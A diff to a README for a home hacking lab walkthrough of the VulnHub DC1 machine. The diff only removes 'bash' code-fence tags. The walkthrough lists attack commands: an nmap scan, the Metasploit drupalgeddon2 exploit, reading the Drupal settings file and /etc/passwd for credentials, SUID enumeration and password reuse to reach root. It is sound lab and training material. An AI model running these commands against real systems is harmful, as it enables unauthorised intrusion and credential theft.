@@ -7,7 +7,7 @@ This section of the home hacking lab project focuses on downloading and exploiti
 - **Virtualization Software:** VirtualBox
 - **Operating Systems:** Kali Linux, DC1 VulnHub machine
 - **Security Tools:** Metasploit, nmap, Hydra, LinPEAS, MySQL
-- **Scripting:** Bash
+- **Scripting:** 
 
 ## Environments Used
 - **Kali Linux:** Attacker Machine
@@ -52,18 +52,18 @@ The objective is to exploit the DC1 VulnHub machine by identifying and capturing
 
 ##### Verify DC1 Machine is Running
 - Ensure the DC1 machine is up and running by pinging its IP address:
-  ```bash
+  ```
   ping 10.0.200.6
 
 #### Information Gathering
 - Perform an nmap scan to identify open ports and services:
-`bash
+`
 nmap -A -sC -oN dc.txt 10.0.200.6`
 
 #### Enumerate the Web Application
 - Access the web application running on port 80 and identify that it is using Drupal.
 - Use Metasploit to find and exploit vulnerabilities in Drupal:
-`bash
+`
 msfconsole
 search drupal
 use exploit/unix/webapp/drupal_drupalgeddon2
@@ -72,8 +72,7 @@ run`
 
 #### Capture Initial Flag
 - Once you gain a shell, navigate the file system to find the first flag:
-`bash
-Copy code
+`
 find / -name flag1.txt
 cat /path/to/flag1.txt`
 - Flag 1 Content: "Every good CMS needs a config file."
@@ -85,7 +84,7 @@ Objective: Identify and capture the second flag by exploiting the database.
 
 #### Identify Configuration Files
 - Use the hint from Flag 1 to locate the Drupal configuration file:
-`bash
+`
 cat /var/www/html/sites/default/settings.php`
 
 ##### Find Database Credentials
@@ -93,12 +92,12 @@ cat /var/www/html/sites/default/settings.php`
 
 ##### Connect to the Database
 - Use the credentials to connect to the MySQL database:
-`bash
+`
 mysql -u dbuser -p`
 
 ##### Enumerate Database and Capture Flag
 - Enumerate the database to find the second flag:
-`bash
+`
 show databases;
 use drupal;
 show tables;
@@ -112,17 +111,17 @@ Objective: Identify and capture the third flag by performing privilege escalatio
 
 ##### Identify Weak Configurations
 - Search for files with weak permissions or misconfigurations that could allow privilege escalation:
-`bash
+`
 find / -perm -4000 -type f 2>/dev/null`
 
 ##### Exploit Weakness
 - Use tools like GTFOBins to escalate privileges:
-`bash
+`
 /path/to/vulnerable_binary`
 
 ##### Capture Third Flag
 - Once privileges are escalated, navigate the file system to find the third flag:
-`bash
+`
 find / -name flag3.txt
 cat /path/to/flag3.txt`
 - Flag 3 Content: "There's more than one way to skin a cat."
@@ -134,18 +133,18 @@ Objective: Identify and capture the fourth flag by exploiting user credentials.
 
 ##### Enumerate Users
 - List all users on the system and look for interesting files in their home directories:
-`bash
+`
 cat /etc/passwd
 ls /home`
 
 ##### Check for Reused Passwords
 - Try using previously discovered passwords to switch to different users:
-`bash
+`
 su - username`
 
 ##### Capture Fourth Flag
 - Navigate the user's home directory to find the fourth flag:
-`bash
+`
 find /home -name flag4.txt
 cat /path/to/flag4.txt`
 - Flag 4 Content: "You can use the same method to find or access the root flag."
@@ -161,12 +160,12 @@ Objective: Identify and capture the final flag by gaining root access.
 
 ##### Exploit and Gain Root Access
 - Perform the privilege escalation to gain root access:
-`bash
+`
 /path/to/exploit`
 
 ##### Capture Final Flag
 - Navigate to the root directory and find the final flag:
-`bash
+`
 cd /root
 cat final_flag.txt`
 - Final Flag Content: "Well done! You have completed the DC1 challenge."
